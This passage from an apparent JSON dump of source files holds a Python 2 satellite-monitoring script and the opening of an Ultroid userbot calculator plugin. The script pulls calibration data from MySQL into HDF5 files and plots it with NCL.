conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'],\n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor(MySQLdb.cursors.DictCursor)\n        conn.select_db(conf.db_setting['stat_db'])      \n        cur.execute(sql_1year)\n        cur.execute(sql_life)\n        begin_data = cur.fetchall()\n        cur.close()\n        conn.close()\n    except MySQLdb.Error, e:\n        # do NOT exit in thread!! To avoid zombie process.\n        msg = 'qqqdraw obc 2-dim png`Mysql Fatal Error[' + str(e.args[0]) \\\n            + ']: ' + e.args[1] \n        print msg             \n        common.err(my_log, log_tag, time_tag + msg)\n        return False\n    \ndef create_1year_hdf(tmpfile1year,tmpfilelife,type1,type,hfile):\n    data_1year = numpy.loadtxt(tmpfile1year +'.' +type1 + '.txt', dtype='str', delimiter=',')\n    ymdh_arr = numpy.array(map(common.time_to_arr, data_1year[:, 0]) )\n    hfile.create_dataset(type+\"_time_1year\", data = ymdh_arr.astype(numpy.int32))\n    hfile.create_dataset(type+\"_avg_1year\",data=data_1year[: ,3].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_max_1year\",data=data_1year[: ,4].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_min_1year\",data=data_1year[: ,5].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_std_1year\",data=data_1year[: ,6].astype(numpy.float32)) \n    \n    \n    data_life = numpy.loadtxt(tmpfilelife +'.' +type1 + '.txt', dtype='str', delimiter=',')\n    ymdh_arr = numpy.array(map(common.time_to_arr, data_life[:, 0]) )\n    hfile.create_dataset(type+\"_time_life\", data = ymdh_arr.astype(numpy.int32))\n    hfile.create_dataset(type+\"_avg_life\",data=data_life[: ,3].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_max_life\",data=data_life[: ,4].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_min_life\",data=data_life[: ,5].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_std_life\",data=data_life[: ,6].astype(numpy.float32)) \n      \n    return True\n    \n\ndef create_1year_hdf_channel(tmpfile1year,tmpfilelife,type1,type,hfile):\n    data_1year = numpy.loadtxt(tmpfile1year +'.' +type1 + '.txt', dtype='str', delimiter=',')\n    ymdh_arr = numpy.array(map(common.time_to_arr, data_1year[:, 0]) )\n    hfile.create_dataset(type+\"_time_1year\", data = ymdh_arr.astype(numpy.int32))\n    hfile.create_dataset(type+\"_avg_1year\",data=data_1year[: ,4].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_max_1year\",data=data_1year[: ,5].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_min_1year\",data=data_1year[: ,6].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_std_1year\",data=data_1year[: ,7].astype(numpy.float32)) \n    \n    \n    data_life = numpy.loadtxt(tmpfilelife +'.' +type1 + '.txt', dtype='str', delimiter=',')\n    ymdh_arr = numpy.array(map(common.time_to_arr, data_life[:, 0]) )\n    hfile.create_dataset(type+\"_time_life\", data = ymdh_arr.astype(numpy.int32))\n    hfile.create_dataset(type+\"_avg_life\",data=data_life[: ,4].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_max_life\",data=data_life[: ,5].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_min_life\",data=data_life[: ,6].astype(numpy.float32)) \n    hfile.create_dataset(type+\"_std_life\",data=data_life[: ,7].astype(numpy.float32)) \n      \n    return True\n     \n\ndef draw_just_obc():\n    if len(obc_table_3day) <= 0:\n        return True\n    if len(obc_table_1month) <= 0:\n        return True\n    \n    \n    tmpfile3day = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() +'.3day' +'.obc'\n    sql_3day = common.get_obc_2dim_sql(ins_conf.obc_to_db.values(),ins_conf.channels,\n                                  obc_table_3day, conf.obc_select_prefix_sql) \\\n        + conf.export_txt%(tmpfile3day + '.txt')\n    begin_sql_3day = conf.obc_select_prefix_sql + ' 1 from ' + obc_table_3day[0] \\\n                + \" limit 1\"   \n    \n    tmpfile1month = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() +'.1month' +'.obc'\n    sql_1month = common.get_obc_2dim_sql(ins_conf.obc_to_db.values(),ins_conf.channels,\n                                  obc_table_1month, conf.obc_select_prefix_sql) \\\n        + conf.export_txt%(tmpfile1month + '.txt')\n        \n\n\n    \n\n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'],\n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor(MySQLdb.cursors.DictCursor)\n        conn.select_db(conf.table_setting[sat][ins]['data_db'])      \n        cur.execute(sql_3day)\n        cur.execute(sql_1month)\n        \n        cur.execute(begin_sql_3day)\n        begin_data = cur.fetchall()\n        cur.close()\n        conn.close()\n    except MySQLdb.Error, e:\n        # do NOT exit in thread!! To avoid zombie process.\n        #print sql_3day\n        #print \"------------------\"\n        #print sql_1month\n        #print \"------------------\"\n        #print sql_3day_calc\n        #print \"------------------\"\n        #print sql_1month_calc\n        #print \"------------------\"\n        #print begin_sql_3day\n        #print \"------------------\"\n        msg = '??draw obc 2-dim png`Mysql Fatal Error[' + str(e.args[0]) \\\n            + ']: ' + e.args[1] \n        print msg             \n        common.err(my_log, log_tag, time_tag + msg)\n        return False\n    \n \n    tmpfile1year = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() +'.1year' + '.obc'\n    tmpfilelife = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS() +'.life' + '.obc'\n\n    \n    sds_len = len(ins_conf.sds_name)\n    for i in xrange(1, sds_len+1):\n        get_obc_txt(tmpfile1year,tmpfilelife,ins_conf.sds_name[i]['name'])\n\n#     \n#     get_obc_txt(tmpfile1year,tmpfilelife,'cold_ang_minus')\n#     get_obc_txt(tmpfile1year,tmpfilelife,'hot_ang_minus')\n#     get_obc_txt(tmpfile1year,tmpfilelife,'earth_ang_minus')\n#     get_obc_txt(tmpfile1year,tmpfilelife,'scan_prd')\n    \n\n    \n    tmphdf = '/assimilation/fymonitor/DATA/TMP/' + my_tag + '.' + common.utc_YmdHMS()+'.OBC.HDF'\n    print tmphdf\n    # trans txt result to numpy fmt, to easy hdf create.\n    data_3day = numpy.loadtxt(tmpfile3day + '.txt', dtype='str', delimiter=',')\n    data_1month = numpy.loadtxt(tmpfile1month + '.txt', dtype='str', delimiter=',')\n    \n    \n    \n    hfile = h5.File(tmphdf, 'w') # w: rewrite if hdf already exist.\n    ymdh_arr = numpy.array(map(common.time_to_arr, data_1month[:, 0]) )\n    hfile.create_dataset(\"time_1month\", data = ymdh_arr.astype(numpy.int32)) \n    ret = create_obc_hdf('1month',hfile,data_1month, ins_conf.obc_to_db_out.values())\n\n    ymdh_arr = numpy.array(map(common.time_to_arr, data_3day[:, 0]) )\n    hfile.create_dataset(\"time_3day\", data = ymdh_arr.astype(numpy.int32))     \n    ret = create_obc_hdf('3day',hfile,data_3day, ins_conf.obc_to_db_out.values())\n    \n    \n    \n    if not ret:\n        return False\n\n#     ymdh_arr = numpy.array(map(common.time_to_arr, data_1month_calc[:, 0]) )\n#     hfile.create_dataset(\"time_1month_calc\", data = ymdh_arr.astype(numpy.int32))\n#     #hfile.create_dataset('cold_ang_minus_1month_calc',data=data_1month_calc[: ,1]*0.001.astype(numpy.int32))\n#     hfile.create_dataset('cold_ang_minus_1month_calc',data=data_1month_calc[: ,1].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('hot_ang_minus_1month_calc',data=data_1month_calc[: ,2].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('earth_ang_minus_1month_calc',data=data_1month_calc[: ,3].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('scan_prd_1month_calc',data=data_1month_calc[: ,4].astype(numpy.float32))\n#     #ret = create_obc_hdf('1month_calc',hfile,data_1month, ins_conf.calc_to_db.values())\n# \n#     ymdh_arr = numpy.array(map(common.time_to_arr, data_3day_calc[:, 0]) )\n#     hfile.create_dataset(\"time_3day_calc\", data = ymdh_arr.astype(numpy.int32)) \n#     hfile.create_dataset('cold_ang_minus_3day_calc',data=data_3day_calc[: ,1].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('hot_ang_minus_3day_calc',data=data_3day_calc[: ,2].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('earth_ang_minus_3day_calc',data=data_3day_calc[: ,3].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('scan_prd_3day_calc',data=data_3day_calc[: ,4].astype(numpy.float32))\n#         \n#     #ret = create_obc_hdf('3day_calc',hfile,data_3day, ins_conf.calc_to_db.values())\n\n    \n   \n    \n    \n    sds_len = len(ins_conf.sds_name)\n    for i in xrange(1, sds_len+1):\n        create_1year_hdf(tmpfile1year,tmpfilelife,ins_conf.sds_name[i]['name'],ins_conf.sds_name_out[i]['name'],hfile)\n        \n#     \n#     create_1year_hdf(tmpfile1year,tmpfilelife,'cold_ang_minus',hfile)\n#     create_1year_hdf(tmpfile1year,tmpfilelife,'hot_ang_minus',hfile)\n#     create_1year_hdf(tmpfile1year,tmpfilelife,'earth_ang_minus',hfile)\n#     create_1year_hdf(tmpfile1year,tmpfilelife,'scan_prd',hfile)\n\n    hfile.close()\n    #return True\n\n    # like: FY3C_MWTS_20140303_0259_TO_20140428_1159_12H_[PRT|INS_TEMP|...]\n    png_title = sat.upper() + '_' + ins.upper() + '_' \\\n                + begin_data[0]['ymdhms'].strftime(\"%Y%m%d\") + '_' \\\n                + begin_data[0]['ymdhms'].strftime(\"%H%M\") + '_TO_' \\\n                + datetime.utcfromtimestamp(timespan['end_t']).strftime('%Y%m%d') \\\n                + '_' \\\n                + datetime.utcfromtimestamp(timespan['end_t']).strftime('%H%M') \\\n                + '_' \\\n                + format(int(hour_span), '02d') + 'H_'\n\n    ret = draw_nochannel(tmphdf, png_title,begin_data[0]['ymdhms'].strftime(\"%Y%m%d\"),\\\n                       datetime.utcfromtimestamp(timespan['end_t']).strftime('%Y%m%d'))\n\n    return True\n    \ndef draw_nochannel(tmphdf, png_title, begin_time, end_time):    \n    cmd = []\n    sds_len = len(conf.draw_ncl_new[ins]['ncl_prog_no_channel'])\n    for i in xrange(0, sds_len): \n        file_out = conf.plot_path + '/'+ png_title + conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png']\n        file_title = png_title + conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png']\n        ncl_name = conf.plot_path +'/' + sat.upper() +'_' + ins.upper() +'_'+ conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png'] + '_4SUB.ncl'\n        temp_log = conf.tmp_path + '/monitor.' + log_tag +'.' + conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png'] +'.log'\n        temp_cmd = conf.ncl + \" 'sat=\\\"\" + sat.upper() + \"\\\"' \" \\\n            + \"'instrument=\\\"\" + ins.upper() + \"\\\"\" +'\\'' \\\n            + \" 'file_in=\\\"\" + tmphdf + \"\\\"' \" \\\n            + \" 'file_out=\\\"\" + file_out + \"\\\"' \" \\\n            + \" 'file_title=\\\"\" + file_title + \"\\\"' \" +  ncl_name \\\n            + ' > ' + temp_log + ' 2>&1'\n        print temp_cmd\n        cmd.append(temp_cmd)\n\n    #print cmd\n \n    timeuse_begin = time.time()\n    \n    for cmd_temp in cmd:\n        print cmd_temp\n        (status, output) = commands.getstatusoutput(cmd_temp)\n        common.debug(my_log, log_tag, str(status) + '`' + cmd_temp + '`' + output)\n\n#     pooltest = ThreadPool()\n#     ret = pooltest.map(commands.getstatusoutput, cmd )\n#     pooltest.close()\n#     pooltest.join()\n    \n    timeuse_end = time.time()\n    timeuse = str(round(timeuse_end - timeuse_begin, 2))\n    print timeuse\n\n    sds_len = len(conf.draw_ncl_new[ins]['ncl_prog_no_channel'])\n    for i in xrange(0, sds_len): \n        file_out = conf.plot_path + '/'+ png_title + conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png']\n        temp_log = conf.tmp_path + '/monitor.' + log_tag + '.' + conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png'] +'.log'\n        # check png.OK\n        if not common.check_file_exist(file_out + '.png', check_ok = True):\n            msg = 'ncl program error: output png file not exist.' + file_out\n            print msg\n            common.error(my_log, log_tag, time_tag + msg)\n            return False\n        \n        dest_path = '/hds/assimilation/fymonitor/DATA/IMG/NSMC' + '/' + sat.upper() + '/' + ins.upper() + '/' \\\n                  + conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png'] + '/' \n        arch_path = dest_path + str(end_time[0:4]) + '/'\n        latest_path = dest_path + 'LATEST/' \n        try:\n            shutil.copyfile(file_out + '.png', arch_path + png_title + conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png'] + '.png')\n            common.empty_folder(latest_path)\n            common.mv_file(file_out + '.png', latest_path + png_title  + conf.draw_ncl_new[ins]['ncl_prog_no_channel'][i]['tmp_png'] + '.png')\n            os.remove(file_out + '.png.OK')\n            os.remove(temp_log)\n        except:\n            msg = 'png created, but cp or mv to dest error'\n            print msg\n            common.error(my_log, log_tag, time_tag + msg)\n            return False\n\n    try:\n        print 'ssss'\n        #os.remove(tmphdf)\n        #os.remove(tmphdf + '.txt')\n    except OSError,e:\n        msg = 'clean tmp file error[' + str(e.args[0])+']: ' + e.args[1]  \n        print msg            \n        common.warn(my_log, log_tag, time_tag + msg)\n    \n    return True\n\n\ndef draw_obc(input):\n    #for test!!!!!\n#     if input != 'just_obc':\n#         return\n#     if input != 1:\n#         return\n    print input\n    if input == 'just_obc':\n        return draw_just_obc()\n    else:\n        return draw_one_channel(input)\n \ndef main():\n    global my_channel_table\n    global my_Calc_channel_table\n    global my_obc_table\n    global my_Calc_table\n    \n    common.wt_file(my_pidfile, str(pid))\n    common.info(my_log, log_tag, time_tag + 'program start')\n\n    # register signal function.\n    signal.signal(signal.SIGTERM, signal_handler)   \n    signal.signal(signal.SIGINT, signal_handler)      \n    \n    # check ps result, kill previous same program, avoiding hang.\n    # we do NOT grep --date=2014-04-27-18 for convenience.\n    cmd = conf.ps + ' -elf | ' + conf.grep + ' ' + conf.bin_path + ' | ' \\\n        + conf.grep + ' -v grep | ' + conf.grep + ' -v tail | ' + conf.grep \\\n        + ' -v bash | ' + conf.grep + ' ' + fname + ' | ' + conf.grep \\\n        + \" '\\-\\-sat=\" + sat + \"' | \" + conf.grep + \" '\\-\\-ins=\" + ins \\\n        + \"' | \" + conf.grep + \" '\\-\\-span=\" + hour_span + \"' | \" \\\n        + conf.awk + \" '{print $4}'\"\n    (status, value) = commands.getstatusoutput(cmd)\n    pid_list = value.split()\n    for one_pid in pid_list:\n        if int(one_pid) != pid:\n            msg = 'more then one prog find, kill old same prog[' + one_pid + ']'\n            common.err(my_log, log_tag, time_tag + msg)\n            cmd = conf.kill + ' -kill ' + one_pid\n            commands.getstatusoutput(cmd)\n    \n    #get the correct tables. we MUST get table name from INFO db, not show tables!!\n    \"\"\"\n    We MUST create fy3b-mwts table's info, for easy time search\n    also, there is a BUG... ...\n    \"\"\"\n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'],\n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor()\n        conn.select_db(conf.table_setting[sat][ins]['data_db'])\n        cur.execute('show tables') # the result is already sorted by ascii.\n        all_tables = cur.fetchall()\n        cur.close()\n        conn.close()\n    except MySQLdb.Error, e:\n        msg = 'Mysql Fatal Error[' + str(e.args[0])+']: '+e.args[1] \n        common.err(my_log, log_tag, time_tag + msg)\n        sys.exit(3)\n        \n    # ignore L1B table.\n    all_obc_table = [ x for x in all_tables if 'OBCXX_MS' in x[0] ]\n    \n    Calc_tag = 'OBCXX_MS_CALC'\n    Calc_channel_tag='OBCXX_MS_CALC_'\n    Calc_table = [ x for x in all_obc_table if Calc_tag in x[0]]\n    Calc_channel_table=[ x for x in Calc_table if Calc_channel_tag in x[0]]\n    Calc_table =[ x for x in Calc_table if Calc_channel_tag not in x[0]]\n    \n    channel_tag = 'OBCXX_MS_' + str(ins_conf.channels)\n    channel_table = [ x for x in all_obc_table if channel_tag in x[0]]\n    channel_table=list(set(channel_table).difference(set(Calc_table)).difference(set(Calc_channel_table)))\n    \n    obc_table = list(set(all_obc_table).difference(set(Calc_table)).difference(set(channel_table)).difference(set(Calc_channel_table))) #return in all_obc_table but no in channel_table\n    #print obc_table\n    #print \"-------------------------\"\n    #print Calc_table\n    #print \"-------------------------\"\n    #print channel_table\n    #print \"-------------------------\"\n    #print Calc_channel_table\n\n\n    for idx, one_table in enumerate(Calc_table):\n        table_t = one_table[0][19:32] # FY3B_MWTSX_GBAL_L1_20131123_0501_060KM_MS\n        timeArray = time.strptime(table_t, \"%Y%m%d_%H%M\")\n        cur_timeStamp = time.mktime(timeArray)\n        if idx < len(all_tables) - 1:\n            table_t = all_tables[idx+1][0][19:32]\n            timeArray = time.strptime(table_t, \"%Y%m%d_%H%M\")\n            next_timeStamp = time.mktime(timeArray)\n        else:\n            timeArray = time.strptime('3013-12-08 00:00', \"%Y-%m-%d %H:%M\")\n            next_timeStamp = time.mktime(timeArray)\n        \n        if timespan['begin_t'] == cur_timeStamp:\n            my_Calc_table.extend([one_table[0]])\n        elif timespan['begin_t'] > cur_timeStamp \\\n            and timespan['begin_t'] < next_timeStamp:\n            my_Calc_table.extend([one_table[0]])\n        elif timespan['begin_t'] < cur_timeStamp \\\n            and timespan['end_t'] > cur_timeStamp:\n            my_Calc_table.extend([one_table[0]])\n        elif timespan['end_t'] == cur_timeStamp:\n            break\n            \n    if len(my_Calc_table)<=0:\n        msg = time_tag + 'no table found for my_Calc_table data'\n        common.warn(my_log, log_tag, msg)\n        \n    #now_time = datetime.datetime.now()\n    now_time = datetime.now() - timedelta(days = 3)\n    shifen = now_time.strftime(\"%H%M\")\n    \n    if int(shifen)< 0030:\n        for i in range(0, 3):\n            yes_time = now_time + datetime.timedelta(days=(-3 + i))\n            ymd = yes_time.strftime('%Y%m%d')\n            ymd = '201410'+ymd[6:8]\n            for idx, one_table in enumerate(my_channel_table):\n                if ymd in one_table:\n                    Calc_table_3day.extend([one_table])\n    else:\n        for i in range(0, 3):\n            #yes_time = now_time + datetime.timedelta(days=(-2 + i))\n            yes_time = now_time + timedelta(days=(-2 + i))\n            ymd = yes_time.strftime('%Y%m%d')\n            ymd = '201410'+ymd[6:8]\n            for idx, one_table in enumerate(my_Calc_table):\n                if ymd in one_table:\n                    Calc_table_3day.extend([one_table])\n   \n    for i in range(0, 30):\n        #yes_time = now_time + datetime.timedelta(days=(-30 + i))\n        yes_time = now_time + timedelta(days=(-30 + i))\n        ymd = yes_time.strftime('%Y%m%d')\n        ymd = '201410'+ymd[6:8]\n        for idx, one_table in enumerate(my_Calc_table):\n            if ymd in one_table:\n                Calc_table_1month.extend([one_table])\n\n    \n#         sys.exit(4)\n    \n    for idx, one_table in enumerate(obc_table):\n        table_t = one_table[0][19:32] # FY3B_MWTSX_GBAL_L1_20131123_0501_060KM_MS\n        timeArray = time.strptime(table_t, \"%Y%m%d_%H%M\")\n        cur_timeStamp = time.mktime(timeArray)\n        if idx < len(all_tables) - 1:\n            table_t = all_tables[idx+1][0][19:32]\n            timeArray = time.strptime(table_t, \"%Y%m%d_%H%M\")\n            next_timeStamp = time.mktime(timeArray)\n        else:\n            timeArray = time.strptime('3013-12-08 00:00', \"%Y-%m-%d %H:%M\")\n            next_timeStamp = time.mktime(timeArray)\n        \n        if timespan['begin_t'] == cur_timeStamp:\n            my_obc_table.extend([one_table[0]])\n        elif timespan['begin_t'] > cur_timeStamp \\\n            and timespan['begin_t'] < next_timeStamp:\n            my_obc_table.extend([one_table[0]])\n        elif timespan['begin_t'] < cur_timeStamp \\\n            and timespan['end_t'] > cur_timeStamp:\n            my_obc_table.extend([one_table[0]])\n        elif timespan['end_t'] == cur_timeStamp:\n            break\n        \n    if len(my_obc_table)<=0:\n        msg = time_tag + 'no table found for 2-dims data'\n        common.info(my_log, log_tag, msg)\n        sys.exit(4)\n    \n    # sort by filename time asc.\n    my_obc_table = sorted(my_obc_table)\n    \n    #now_time = datetime.datetime.now()\n    now_time = datetime.now()- timedelta(days = 3)\n    shifen = now_time.strftime(\"%H%M\")\n    \n    if int(shifen)< 0030:\n        for i in range(0, 3):\n            yes_time = now_time + datetime.timedelta(days=(-3 + i))\n            ymd = yes_time.strftime('%Y%m%d')\n            ymd = '201410'+ymd[6:8]\n            for idx, one_table in enumerate(my_obc_table):\n                if ymd in one_table:\n                    obc_table_3day.extend([one_table])\n    else:\n        for i in range(0, 3):\n            #yes_time = now_time + datetime.timedelta(days=(-2 + i))\n            yes_time = now_time + timedelta(days=(-2 + i))\n            ymd = yes_time.strftime('%Y%m%d')\n            ymd = '201410'+ymd[6:8]\n            print ymd\n            for idx, one_table in enumerate(my_obc_table):\n                if ymd in one_table:\n                    obc_table_3day.extend([one_table])\n \n    for i in range(0, 30):\n        #yes_time = now_time + datetime.timedelta(days=(-30 + i))\n        yes_time = now_time + timedelta(days=(-30 + i))\n        ymd = yes_time.strftime('%Y%m%d')\n        ymd = '201410'+ymd[6:8]\n        for idx, one_table in enumerate(my_obc_table):\n            if ymd in one_table:\n                obc_table_1month.extend([one_table])\n\n### judge channel table\n######################################################################\n    \n    for idx, one_table in enumerate(channel_table):\n        table_t = one_table[0][19:32] # FY3B_MWTSX_GBAL_L1_20131123_0501_060KM_MS\n        timeArray = time.strptime(table_t, \"%Y%m%d_%H%M\")\n        cur_timeStamp = time.mktime(timeArray)\n        if idx < len(all_tables) - 1:\n            table_t = all_tables[idx+1][0][19:32]\n            timeArray = time.strptime(table_t, \"%Y%m%d_%H%M\")\n            next_timeStamp = time.mktime(timeArray)\n        else:\n            timeArray = time.strptime('3013-12-08 00:00', \"%Y-%m-%d %H:%M\")\n            next_timeStamp = time.mktime(timeArray)\n        \n        if timespan['begin_t'] == cur_timeStamp:\n            my_channel_table.extend([one_table[0]])\n        elif timespan['begin_t'] > cur_timeStamp \\\n            and timespan['begin_t'] < next_timeStamp:\n            my_channel_table.extend([one_table[0]])\n        elif timespan['begin_t'] < cur_timeStamp \\\n            and timespan['end_t'] > cur_timeStamp:\n            my_channel_table.extend([one_table[0]])\n        elif timespan['end_t'] == cur_timeStamp:\n            break\n        \n       \n        \n    if len(my_channel_table)<=0:\n        msg = time_tag + 'no table found for 3-dims data'\n        common.info(my_log, log_tag, msg)\n        sys.exit(4)\n    \n    # sort by filename time asc.\n    my_channel_table = sorted(my_channel_table)\n    \n    #now_time = datetime.datetime.now()\n    now_time = datetime.now()- timedelta(days = 3)\n    shifen = now_time.strftime(\"%H%M\")\n\n    if int(shifen)< 0030:\n        for i in range(0, 3):\n            yes_time = now_time + datetime.timedelta(days=(-3 + i))\n            ymd = yes_time.strftime('%Y%m%d')\n            ymd = '201410'+ymd[6:8]\n            for idx, one_table in enumerate(my_channel_table):\n                if ymd in one_table:\n                    channel_table_3day.extend([one_table])\n    else:\n        for i in range(0, 3):\n            #yes_time = now_time + datetime.timedelta(days=(-2 + i))\n            yes_time = now_time + timedelta(days=(-2 + i))\n            ymd = yes_time.strftime('%Y%m%d')\n            ymd = '201410'+ymd[6:8]\n            print ymd\n            for idx, one_table in enumerate(my_channel_table):\n                if ymd in one_table:\n                    channel_table_3day.extend([one_table])\n \n    for i in range(0, 30):\n        #yes_time = now_time + datetime.timedelta(days=(-30 + i))\n        yes_time = now_time + timedelta(days=(-30 + i))\n        ymd = yes_time.strftime('%Y%m%d')\n        ymd = '201410'+ymd[6:8]\n        for idx, one_table in enumerate(my_channel_table):\n            if ymd in one_table:\n                channel_table_1month.extend([one_table])\n                \n #####################################################################       \n        \n    for idx, one_table in enumerate(Calc_channel_table):\n        table_t = one_table[0][19:32] # FY3B_MWTSX_GBAL_L1_20131123_0501_060KM_MS\n        timeArray = time.strptime(table_t, \"%Y%m%d_%H%M\")\n        cur_timeStamp = time.mktime(timeArray)\n        if idx < len(all_tables) - 1:\n            table_t = all_tables[idx+1][0][19:32]\n            timeArray = time.strptime(table_t, \"%Y%m%d_%H%M\")\n            next_timeStamp = time.mktime(timeArray)\n        else:\n            timeArray = time.strptime('3013-12-08 00:00', \"%Y-%m-%d %H:%M\")\n            next_timeStamp = time.mktime(timeArray)\n        \n        if timespan['begin_t'] == cur_timeStamp:\n            my_Calc_channel_table = [].extend([one_table[0]])\n        elif timespan['begin_t'] > cur_timeStamp \\\n            and timespan['begin_t'] < next_timeStamp:\n            my_Calc_channel_table.extend([one_table[0]])\n        elif timespan['begin_t'] < cur_timeStamp \\\n            and timespan['end_t'] > cur_timeStamp:\n            my_Calc_channel_table.extend([one_table[0]])\n        elif timespan['end_t'] == cur_timeStamp:\n            break             \n                \n                \n                \n    if len(my_Calc_channel_table)<=0:\n        msg = time_tag + 'no table found for 3-dims data'\n        common.info(my_log, log_tag, msg)\n        sys.exit(4)\n    \n    # sort by filename time asc.\n    my_Calc_channel_table = sorted(my_Calc_channel_table)\n    \n    #now_time = datetime.datetime.now()\n    now_time = datetime.now()- timedelta(days = 3)\n    shifen = now_time.strftime(\"%H%M\")\n\n    if int(shifen)< 0030:\n        for i in range(0, 3):\n            yes_time = now_time + datetime.timedelta(days=(-3 + i))\n            ymd = yes_time.strftime('%Y%m%d')\n            ymd = '201410'+ymd[6:8]\n            for idx, one_table in enumerate(my_Calc_channel_table):\n                if ymd in one_table:\n                    Calc_channel_table_3day.extend([one_table])\n    else:\n        for i in range(0, 3):\n            #yes_time = now_time + datetime.timedelta(days=(-2 + i))\n            yes_time = now_time + timedelta(days=(-2 + i))\n            ymd = yes_time.strftime('%Y%m%d')\n            ymd = '201410'+ymd[6:8]\n            print ymd\n            for idx, one_table in enumerate(my_Calc_channel_table):\n                if ymd in one_table:\n                    Calc_channel_table_3day.extend([one_table])\n \n    for i in range(0, 30):\n        #yes_time = now_time + datetime.timedelta(days=(-30 + i))\n        yes_time = now_time + timedelta(days=(-30 + i))\n        ymd = yes_time.strftime('%Y%m%d')\n        ymd = '201410'+ymd[6:8]\n        for idx, one_table in enumerate(my_Calc_channel_table):\n            if ymd in one_table:\n                Calc_channel_table_1month.extend([one_table])\n                \n                \n                \n                \n    \n                \n                \n\n######################################################################\n\n    #print obc_table_3day\n    #print channel_table_3day\n#     print channel_table_1month\n    \n    \n#     draw_obc('just_obc')\n#     draw_obc(1)\n#     for channel in range(1,ins_conf.channels+1):\n#         draw_obc(channel)\n    \n    # create input for thread. 'just_obc' means draw 2-dim obc data\n    # and, 1...13 means draw 3-dim obc data for each channel\n    pool = Pool()\n    ret = pool.map(draw_obc, ['just_obc'] + range(1, ins_conf.channels + 1) )\n    pool.close()\n    pool.join() \n    if False in ret:\n        msg = 'FAILED`some png may NOT draw.`timeuse='\n    else:\n        msg = 'SUCC`program finish.`timeuse='\n    \n    timeuse_end = time.time()\n    timeuse = str(round(timeuse_end - timeuse_begin, 2))\n    print msg + timeuse\n    common.info(my_log, log_tag, time_tag + msg + timeuse)\n\nif __name__ == '__main__':\n    main()\n\n", "488": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + 